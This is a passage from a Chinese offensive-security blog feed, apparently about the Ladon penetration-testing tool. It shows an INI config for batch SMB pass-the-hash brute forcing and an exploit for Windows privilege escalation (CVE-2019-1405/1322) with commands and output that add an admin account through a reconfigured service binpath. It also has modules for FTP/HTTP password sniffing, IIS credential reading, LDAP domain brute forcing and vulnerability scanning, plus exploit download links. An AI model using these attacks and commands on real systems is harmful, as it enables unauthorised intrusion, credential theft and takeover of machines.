href="#24-PhpStudyPoc-PhpStudy后门检测" class="headerlink" title="24.PhpStudyPoc PhpStudy后门检测"></a>24.PhpStudyPoc PhpStudy后门检测</h3><p>Example: Ladon 192.168.1.8/24 PhpStudyPoc<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_PhpStudyPoc.gif"></p><h3 id="25-DomainIP-域名解析"><a href="#25-DomainIP-域名解析" class="headerlink" title="25.DomainIP 域名解析"></a>25.DomainIP 域名解析</h3><p>Example: Ladon youdomain DomainIP<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_DomainIP.gif"></p><h3 id="26-SubDomain-子域名爆破"><a href="#26-SubDomain-子域名爆破" class="headerlink" title="26.SubDomain 子域名爆破"></a>26.SubDomain 子域名爆破</h3><p>Example: Ladon 192.168.1.8/24 SubDomain<br>需域名字典SubDomain.dic<br>例子: Ladon baidu.com SubDomain<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_SubDomain.gif"></p><h3 id="27-WebDir-Web目录扫描"><a href="#27-WebDir-Web目录扫描" class="headerlink" title="27.WebDir Web目录扫描"></a>27.WebDir Web目录扫描</h3><p>Example: Ladon <a href="http://youweb.com" target="_blank" rel="noopener">http://youweb.com</a> WebDir<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_WebDir.gif"></p><h3 id="28-ActiveMQPoc-ActiveMQ漏洞扫描"><a href="#28-ActiveMQPoc-ActiveMQ漏洞扫描" class="headerlink" title="28.ActiveMQPoc ActiveMQ漏洞扫描"></a>28.ActiveMQPoc ActiveMQ漏洞扫描</h3><p>Example: Ladon 192.168.1.8/24 ActiveMQPoc<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_ActiveMQPoc.gif"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Ladon 6.2支持Cobalt Strike 4.0,内置58个功能&lt;br&gt;加载脚本Ladon.cna,通过Beacon命令或右键使用&lt;
      
    
    </summary>
    
    
      <category term="Cobalt Strike" scheme="http://k8gege.org/categories/CS/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
      <category term="Cobalt Strike" scheme="http://k8gege.org/tags/CS/"/>
    
  </entry>
  
  <entry>
    <title>Ladon 6.2自定义密码爆破</title>
    <link href="http://k8gege.org/p/53177.html"/>
    <id>http://k8gege.org/p/53177.html</id>
    <published>2020-03-29T16:10:00.000Z</published>
    <updated>2020-03-30T04:04:31.764Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>内置密码爆破模块还不够全面，研发其它协议认证需要时间。<br>先不说功能实现，首先搭建各种协议认证环境就不少时间吧。<br>还有别人的工具不开源的情况，而且它只能支持单个IP爆破。<br>这时候我们需要批量爆破整个C段、多个网段、或批量列表。<br>批量包括但不限于IP、URL、机器名、CIDR格式、任意XX等。</p><h3 id="INI配置插件"><a href="#INI配置插件" class="headerlink" title="INI配置插件"></a>INI配置插件</h3><p>适用场景，需调用相关命令或第三方工具进行批量操作<br>或者有新的POC，但来不及或无法写成DLL来调用时<br>很多第3方工具不支持批量或者说根本不支持批量网段<br>而Ladon不只限于批量IP、URL、IP段、任意内容等<br>是紧急情况下最适合用于验证内网是否存在漏洞工具<br>新的漏洞来时你能调好POC就不错了，批量更要时间</p><h3 id="自定义密码爆破"><a href="#自定义密码爆破" class="headerlink" title="自定义密码爆破"></a>自定义密码爆破</h3><p>例子：调用修改过的smbexec.exe进行HASH密码验证，原版不退出无法爆破<br>根目录下放4个文件，smbexec.exe、smbhash.ini、user.txt、pass.txt。</p><p>smbhash.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=smbexec.exe</span><br><span class="line">arg=-hashes <span class="variable">$pass</span>$ <span class="variable">$user</span><span class="variable">$@</span><span class="variable">$ip</span>$</span><br><span class="line">isok=Launching semi-interactive shell</span><br><span class="line">port=445</span><br><span class="line"><span class="built_in">log</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="INI插件用法"><a href="#INI插件用法" class="headerlink" title="INI插件用法"></a>INI插件用法</h3><p>命令：Ladon 192.168.1.1/24 smbhash.ini</p><h3 id="INI参数说明"><a href="#INI参数说明" class="headerlink" title="INI参数说明"></a>INI参数说明</h3><p>exe:  程序名称，必填项。不指定路径优先加载SYSTEM32目录或当前目录下程序<br>arg:  程序参数，必填项。其中$ip$、$user$、$pass$变量为字典文件替换变量<br>isok：成功标志，必填项。如smbexec成功时返回”Launching semi-interactive shell”<br>port：对应端口，非必填。如SMB为445，Ladon先检测到端口开放，才进行密码爆破<br>log:  程序日志，非必填。如有些程序返回一堆错误结果，我们不想看，可不显示</p><p>检测内网C段是否使用同一个密码,命令：Ladon 192.168.1.1/24 smbhash.ini<br>截图为6.1，大家记得把ret改成isok就行了。<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/DiyIniPwd.PNG"></p><h3 id="功能多余？"><a href="#功能多余？" class="headerlink" title="功能多余？"></a>功能多余？</h3><p>有人可能会说，功能用不到，批量用自己的程序就可以了。<br>1.不是所有人都会编程，INI配置的目的主要是给这些人用的。<br>2.据我所知市面上的批量，仅支持批量单一列表，如IP列表、URL列表等，且不支持模块化。</p><p>举个例子：CVE-2019-0708原版漏洞检测批量支持C段扫描，但不支持批量C段甚至批量B段扫描。<br>没错它是开源的，但有几个人去实现修改让它支持更多实战环境的批量需求？<br>C语言的多线程操作可和Python这种小学生都能轻松学会的人随便写的啊。<br>如果别的Poc，用其它你不懂的语言来写，你需要急用，你还会慢慢去学？<br>当然你不觉得麻烦，也可以另外用自己会的语言写个批量调用工具，哈哈</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;内置密码爆破模块还不够全面，研发其它协议认证需要时间。&lt;br&gt;先不说功能实现，首先搭建各种协议认证环境就不少时间吧。&lt;br&gt;还有别人的工具不
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
  </entry>
  
  <entry>
    <title>利用SqlDataSourceEnumerator获取局域网SQL主机</title>
    <link href="http://k8gege.org/p/61471.html"/>
    <id>http://k8gege.org/p/61471.html</id>
    <published>2020-03-28T03:39:45.695Z</published>
    <updated>2020-01-18T11:51:43.871Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>SQL Server 允许应用程序在当前网络中查找 SQL Server 实例。 SqlDataSourceEnumerator 类向应用程序开发人员公开此信息，提供包含所有可见服务器的信息的 DataTable。 此返回的表包含网络上可用的服务器实例的列表，该列表与用户尝试创建新连接时提供的列表匹配，并展开包含连接属性上所有可用服务器的下拉列表。对话框。 显示的结果并非总是完整的。</p><h3 id="SqlDataSourceEnumerator"><a href="#SqlDataSourceEnumerator" class="headerlink" title="SqlDataSourceEnumerator"></a>SqlDataSourceEnumerator</h3><p>命名空间: System.Data.Sql<br>程序集: System.Data.dll</p><p>提供了一种枚举本地网络内的所有可用 SQL Server 实例的机制。</p><p>通过方法调用返回的表包含以下列，所有列均包含 string 值：<br>列     描述<br>ServerName     服务器的名称。<br>InstanceName     服务器实例的名称。 如果服务器作为默认实例运行，则为空白。<br>IsClustered     指示服务器是否属于群集。<br>Version     服务器的版本。 例如:</p><p>-9.00 （SQL Server 2005）<br>-10.0. xx （SQL Server 2008）<br>-10.50 （SQL Server 2008 R2）<br>-11.0. xx （SQL Server 2012）</p><h3 id="C-示例代码"><a href="#C-示例代码" class="headerlink" title="C#示例代码"></a>C#示例代码</h3><p>.NET与PowerShell谁的兼容性和执行效率更好就不用我说了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">using System.Data.Sql;  </span><br><span class="line">  </span><br><span class="line">class Program  </span><br><span class="line">&#123;  </span><br><span class="line">  static void Main()  </span><br><span class="line">  &#123;  </span><br><span class="line">    &#x2F;&#x2F; Retrieve the enumerator instance and then the data.  </span><br><span class="line">    SqlDataSourceEnumerator instance &#x3D;  </span><br><span class="line">      SqlDataSourceEnumerator.Instance;  </span><br><span class="line">    System.Data.DataTable table &#x3D; instance.GetDataSources();  </span><br><span class="line">  </span><br><span class="line">    &#x2F;&#x2F; Display the contents of the table.  </span><br><span class="line">    DisplayData(table);  </span><br><span class="line">  </span><br><span class="line">    Console.WriteLine(&quot;Press any key to continue.&quot;);  </span><br><span class="line">    Console.ReadKey();  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  private static void DisplayData(System.Data.DataTable table)  </span><br><span class="line">  &#123;  </span><br><span class="line">    foreach (System.Data.DataRow row in table.Rows)  </span><br><span class="line">    &#123;  </span><br><span class="line">      foreach (System.Data.DataColumn col in table.Columns)  </span><br><span class="line">      &#123;  </span><br><span class="line">        Console.WriteLine(&quot;&#123;0&#125; &#x3D; &#123;1&#125;&quot;, col.ColumnName, row[col]);  </span><br><span class="line">      &#125;  </span><br><span class="line">      Console.WriteLine(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PowerShell命令"><a href="#PowerShell命令" class="headerlink" title="PowerShell命令"></a>PowerShell命令</h3><p>系统未安装或禁用PowerShell会失效，但也比国人故意吹捧的PowerUPSQL好很多倍。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\k8gege\Desktop&gt;PowerShell -Command <span class="string">"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"</span></span><br><span class="line"></span><br><span class="line">ServerName          InstanceName        IsClustered         Version</span><br><span class="line">----------          ------------        -----------         -------</span><br><span class="line">K82003-77562E10</span><br><span class="line">WIN-OLDM1T2H9M4</span><br></pre></td></tr></table></figure><h3 id="PowerUPSQL"><a href="#PowerUPSQL" class="headerlink" title="PowerUPSQL"></a>PowerUPSQL</h3><p>此工具也是基于SqlDataSourceEnumerator实现的，兼容性较差，很多系统下运行各种报错。</p><pre><code class="Bash">PS C:\Users\k8gege\Desktop\PowerUpSQL-master&gt; Get-SQLInstanceBroadcast -Verbose详细信息: Attempting to identify SQL Server instances on the broadcast domain.详细信息: 2 SQL Server instances were found.ComputerName                        Instance                           IsClustered                        Version                           ------------                        --------                           -----------                        -------                           K82003-77562E10                     K82003-77562E10                                                                                         WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre><h3 id="Ladon-EnumMssql"><a href="#Ladon-EnumMssql" class="headerlink" title="Ladon EnumMssql"></a>Ladon EnumMssql</h3><p>Ladon的EnumMssql模块不支持扫描，若内网存在多个网段，可使用PortScan扫描探测。<br><img alt="img" data-original="https://camo.githubusercontent.com/2e97e127bfc1acd625ee289dbfaf4b3ffd307bd7/68747470733a2f2f6b38676567652e6769746875622e696f2f6b38696d672f4c61646f6e2f63732f43535f456e756d4d5353514c2e676966"></p><p>Ladon与PowerUPSQL对比，Ladon支持任意Win系统，而PowerUPSQL就未必能用了<br><img alt="img" data-original="https://camo.githubusercontent.com/73b58a071a70adf62dc7f4aecd1dff48d8e5df40/68747470733a2f2f6b38676567652e6769746875622e696f2f6b38696d672f4c61646f6e2f6578652f456e756d4d5353514c2e676966"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/framework/data/adonet/sql/enumerating-instances-of-sql-server" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/data/adonet/sql/enumerating-instances-of-sql-server</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;SQL Server 允许应用程序在当前网络中查找 SQL Server 实例。 SqlDataSourceEnumerator 类向应用程
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term=".NET" scheme="http://k8gege.org/categories/Dotnet/"/>
    
      <category term="内网" scheme="http://k8gege.org/categories/Lan/"/>
    
      <category term="源码" scheme="http://k8gege.org/categories/Code/"/>
    
      <category term="SQL" scheme="http://k8gege.org/categories/SQL/"/>
    
      <category term="编程" scheme="http://k8gege.org/categories/Program/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term=".NET" scheme="http://k8gege.org/tags/Dotnet/"/>
    
      <category term="SQL" scheme="http://k8gege.org/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Windows提权工具 CVE-2019-1405 &amp; CVE-2019-1322</title>
    <link href="http://k8gege.org/p/19321.html"/>
    <id>http://k8gege.org/p/19321.html</id>
    <published>2020-03-28T03:39:45.695Z</published>
    <updated>2020-01-15T15:25:43.260Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>由NCC Group研究人员所发现的两个通过COM本地服务进行非法提权的漏洞。第一个漏洞CVE-2019-1405是COM服务中的一个逻辑错误，可让本地普通用户以LOCAL SERVICE身份执行任意命令。第二个漏洞CVE-2019-1322是一个简单的服务配置错误，可让本地SERVICE组中的任何用户重新配置以SYSTEM权限运行的服务（此漏洞也被其他研究人员发现）。当以上两个漏洞结合在一起时，就允许本地普通用户以SYSTEM权限执行任意命令。</p><p>全面检查了一些Windows服务,发现以LOCAL SERVICE或NETWORK SERVICE运行的所有用户都可以执行这种攻击。其中就包括前面我们提到的UPnP Device Host服务,这样我们就能以本地任意用户身份,结合使用CVE-2019-1405及CVE-2019-1322这两个漏洞,成功在Windows 10(1803到1903)系统上将权限提升至SYSTEM用户。</p><h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>Vendor     Product     Versions<br>Microsoft    Windows 10    -, 1607, 1709, 1803, 1809, 1903<br>Microsoft    Windows 7    -<br>Microsoft    Windows 8.1    -<br>Microsoft    Windows Rt 8.1    -<br>Microsoft    Windows Server 2008    -, R2<br>Microsoft    Windows Server 2012    -, R2<br>Microsoft    Windows Server 2016    -, 1803, 1903<br>Microsoft    Windows Server 2019    -</p><h3 id="默认提权"><a href="#默认提权" class="headerlink" title="默认提权"></a>默认提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\null\Desktop&gt;COMahawk64.exe</span><br><span class="line">[\] Progress:  1/9 2/9 3/9 4/9 5/9 6/9 7/9 8/9 9/9</span><br><span class="line">[+] Hopefully k8gege:K8gege520 is added as an admin.</span><br><span class="line"></span><br><span class="line">C:\Users\null\Desktop&gt;net user</span><br><span class="line"></span><br><span class="line">\\DESKTOP-3F42O5D 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line">k8gege                   null                     WDAGUtilityAccount</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><h3 id="指定命令"><a href="#指定命令" class="headerlink" title="指定命令"></a>指定命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\null\Desktop&gt;COMahawk64.exe <span class="string">"net user k8gege K8gege123? /add"</span></span><br><span class="line">[+] Executing <span class="built_in">command</span> [ sc config UsoSvc binpath= <span class="string">"cmd.exe /c net user k8gege K8gege123? /add"</span> ]</span><br><span class="line">[\] Progress:  1/6 2/6 3/6 4/6 5/6 6/6</span><br><span class="line">[+] Command executed.</span><br><span class="line">C:\Users\null\Desktop&gt;net user</span><br><span class="line"></span><br><span class="line">\\DESKTOP-3F42O5D 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line">k8gege                   null                     WDAGUtilityAccount</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><h3 id="Win10提权"><a href="#Win10提权" class="headerlink" title="Win10提权"></a>Win10提权</h3><p>Teston Win10 X64 1803<br><img data-original="http://k8gege.org/k8img/LPE/COMahawk.PNG"></p><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p><a href="https://github.com/apt69/COMahawk" target="_blank" rel="noopener">https://github.com/apt69/COMahawk</a></p><p><a href="https://github.com/k8gege/K8tools/raw/master/Comahawk.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/Comahawk.rar</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h3&gt;&lt;p&gt;由NCC Group研究人员所发现的两个通过COM本地服务进行非法提权的漏洞。第一个漏洞CVE-2019-1405是COM服
      
    
    </summary>
    
    
      <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
    
      <category term="提权" scheme="http://k8gege.org/categories/Lpe/"/>
    
    
      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
      <category term="LPE" scheme="http://k8gege.org/tags/LPE/"/>
    
  </entry>
  
  <entry>
    <title>Ladon6.0新增密码嗅探、IIS密码读取、LDAP域密码爆破</title>
    <link href="http://k8gege.org/p/56393.html"/>
    <id>http://k8gege.org/p/56393.html</id>
    <published>2020-03-28T03:39:45.679Z</published>
    <updated>2020-01-11T07:35:53.056Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/k8gege" target="_blank" rel="noopener"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Ladon" data-original="https://img.shields.io/badge/Ladon-6.0-yellowgreen"></a> <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener"><img alt="Bin" data-original="https://img.shields.io/badge/Ladon-Bin-ff69b4"></a> <a href="https://github.com/k8gege/Ladon/issues" target="_blank" rel="noopener"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/Ladon"></a><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/Ladon"></a></p><h3 id="Ladon6-0"><a href="#Ladon6-0" class="headerlink" title="Ladon6.0"></a>Ladon6.0</h3><p>新增FTP/HTTP密码嗅探、IIS密码读取、LDAP域密码爆破、<br>进程详细信息获取、渗透相关信息获取、命令行参数信息<br>操作系统识别、Wmi密码爆破、Smb密码爆破等功能优化</p><h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><table><thead><tr><th>动作</th><th>模块</th><th>说明</th></tr></thead><tbody><tr><td>新增</td><td>LdapScan</td><td>AD域密码爆破:基于Ldap协议爆破Windows密码</td></tr><tr><td>新增</td><td>FtpSniffer/SnifferFtp</td><td>Ftp密码嗅探(无需WinPcap)</td></tr><tr><td>新增</td><td>HttpSniffer/SnifferHTTP</td><td>HTTP密码嗅探(无需WinPcap)</td></tr><tr><td>新增</td><td>GetCmdLine/CmdLine</td><td>获取进程命令行参数/可指定进程</td></tr><tr><td>新增</td><td>GetInfo</td><td>获取渗透基础信息（IP、域信息、系统信息、软件信息、网络连接、补丁信息、用户等）</td></tr><tr><td>新增</td><td>GetInfo2</td><td>包含GetInfo &amp; Wmi获取信息</td></tr><tr><td>新增</td><td>Sniffer</td><td>网络嗅探(源地址、目标地址)，可用于发现内网存活主机、恶意木马上线地址</td></tr><tr><td>新增</td><td>EnumIIS/IisWeb</td><td>获取IIS站点、路径、帐号、密码</td></tr><tr><td>新增</td><td>EnumProcess/ProcessList/tasklist</td><td>枚举进程 结果(PID、Session、位数、进程名、用户名、路径、标题)</td></tr><tr><td>更新</td><td>HttpDownload/wget</td><td>HTTP下载命令简化也可使用wget</td></tr><tr><td>更新</td><td>OsScan</td><td>扫描速度优化(某项目批量C段不再卡死)</td></tr><tr><td>更新</td><td>WmiScan</td><td>135端口关闭或RPC不可用停止爆破</td></tr><tr><td>更新</td><td>SmbScan</td><td>445端口关闭停止爆破(功能完美代替IpcScan，只是需使用DLL)</td></tr><tr><td>移除</td><td>IPCScan</td><td>速度慢以及批量可能存在误报将其移除，反正SmbScan完全替代</td></tr><tr><td>更新</td><td>所有模块</td><td>所有功能模块参数忽略大小写</td></tr></tbody></table><h3 id="LdapScan-AD域服务器密码爆破"><a href="#LdapScan-AD域服务器密码爆破" class="headerlink" title="LdapScan AD域服务器密码爆破"></a>LdapScan AD域服务器密码爆破</h3><p>非域内机器也可破解跨网段AD域服务器，LDAP端口为389<br>注意非3389，即便跑出来的密码能登远程桌面也没半毛钱关系<br>还有WMI、SMB(IPC)跑出来的密码也一样，3389是RDP协议<br>WMI端口135，SMB端口445，不要以为能登3389一定能IPC连接<br>有时一个帐密各种协议方法都能连到远程机器只能说运气好<br>不要说这个密码3389可以登，但是WMI或SMB跑不出来，瞎搞<br>默认条件下都不能保证100%，更何况经过配置或出问题的系统<br><img alt="LdapScan" data-original="http://k8gege.org/k8img/Ladon/exe/LdapScan_6.0.gif"></p><h3 id="FtpSniffer-FTP密码嗅探"><a href="#FtpSniffer-FTP密码嗅探" class="headerlink" title="FtpSniffer FTP密码嗅探"></a>FtpSniffer FTP密码嗅探</h3><p>支持两种写法: FtpSniffer/SnifferFtp<br>Example: Ladon FtpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="FtpSniffer" data-original="http://k8gege.org/k8img/Ladon/exe/FtpSniffer.PNG"></p><h3 id="HttpSniffer-HTTP密码嗅探"><a href="#HttpSniffer-HTTP密码嗅探" class="headerlink" title="HttpSniffer HTTP密码嗅探"></a>HttpSniffer HTTP密码嗅探</h3><p>支持两种写法: HttpSniffer/SnifferHTTP<br>Example: Ladon HttpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="HttpSniffer" data-original="http://k8gege.org/k8img/Ladon/exe/HttpSniffer.PNG"></p><h3 id="Sniffer-网络嗅探"><a href="#Sniffer-网络嗅探" class="headerlink" title="Sniffer 网络嗅探"></a>Sniffer 网络嗅探</h3><p>基于Socket RAW嗅探，无需安装Winpcap，但需管理员权限<br>主要用于发现内网存活机器或嗅探管理员登陆FTP或WEB站点密码<br>后续可能会添加其它功能可能另外写个专门用于嗅探的工具</p><p>PS: 目前网上大部嗅探工具都是基于Winpcap抓包，某些机器针对其做限制，会提示找不到网卡无法嗅探。<br>重点是不少程序不是GUI就是只能在Linux下用，如果你用py的SCAPY(需winpcap)来实现发现程序高达48M<br>当然也可用于发现恶意木马上线地址(如Cobal strike默认一分钟才发包的netstat不一定看得到)</p><p>Example: Ladon HttpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="Sniffer" data-original="http://k8gege.org/k8img/Ladon/exe/Sniffer.PNG"></p><h3 id="EnumIIS-IIS站点密码读取"><a href="#EnumIIS-IIS站点密码读取" class="headerlink" title="EnumIIS IIS站点密码读取"></a>EnumIIS IIS站点密码读取</h3><p>获取IIS站点、路径、帐号、密码<br><img alt="EnumIIS" data-original="http://k8gege.org/k8img/Ladon/exe/EnumIIS.PNG"></p><h3 id="EnumProcess-进程详细信息获取"><a href="#EnumProcess-进程详细信息获取" class="headerlink" title="EnumProcess 进程详细信息获取"></a>EnumProcess 进程详细信息获取</h3><p>支持三种写法: EnumProcess/ProcessList/tasklist<br>结果(PID、Session、位数、进程名、用户名、路径、标题)<br><img alt="EnumProcess" data-original="http://k8gege.org/k8img/Ladon/exe/EnumProcess.PNG"></p><h3 id="GetCmdLine-进程启动参数"><a href="#GetCmdLine-进程启动参数" class="headerlink" title="GetCmdLine 进程启动参数"></a>GetCmdLine 进程启动参数</h3><p>进程启动参数/可指定进程<br>支持2种写法: GetCmdLine/CmdLine<br><img alt="getcmdline" data-original="http://k8gege.org/k8img/Ladon/exe/getcmdline.PNG"></p><h3 id="GetInfo-获取渗透基础信息"><a href="#GetInfo-获取渗透基础信息" class="headerlink" title="GetInfo 获取渗透基础信息"></a>GetInfo 获取渗透基础信息</h3><p>获取渗透基础信息（IP、域信息、系统信息、软件信息、网络连接、补丁信息、用户等）<br>GetInfo2 包含GetInfo &amp; Wmi获取的相关信息</p><h3 id="全部功能"><a href="#全部功能" class="headerlink" title="全部功能"></a>全部功能</h3><p><a href="http://k8gege.org/p/648af4b3.html">http://k8gege.org/p/648af4b3.html</a></p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://github.com/k8gege&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;img alt=&quot;Author&quot; data-original=&quot;https://img.shields.io/badge/Author-k
      
    
    </summary>
    
    
      <category term="工具" scheme="http://k8gege.org/categories/Tool/"/>
    
      <category term="密码" scheme="http://k8gege.org/categories/Pass/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term="内网" scheme="http://k8gege.org/categories/Lan/"/>
    
      <category term="嗅探" scheme="http://k8gege.org/categories/Sniffer/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
      <category term="Sniffer" scheme="http://k8gege.org/tags/Sniffer/"/>
    
      <category term="FtpSniffer" scheme="http://k8gege.org/tags/FtpSniffer/"/>
    
      <category term="HttpSniffer" scheme="http://k8gege.org/tags/HttpSniffer/"/>
    
      <category term="IIS" scheme="http://k8gege.org/tags/IIS/"/>
    
      <category term="LDAP" scheme="http://k8gege.org/tags/LDAP/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit/PowerShell内存加载执行.NET</title>
    <link href="http://k8gege.org/p/57438.html"/>
    <id>http://k8gege.org/p/57438.html</id>
    <published>2020-03-28T03:39:45.679Z</published>
    <updated>2020-01-10T15:32:19.936Z</updated>
    
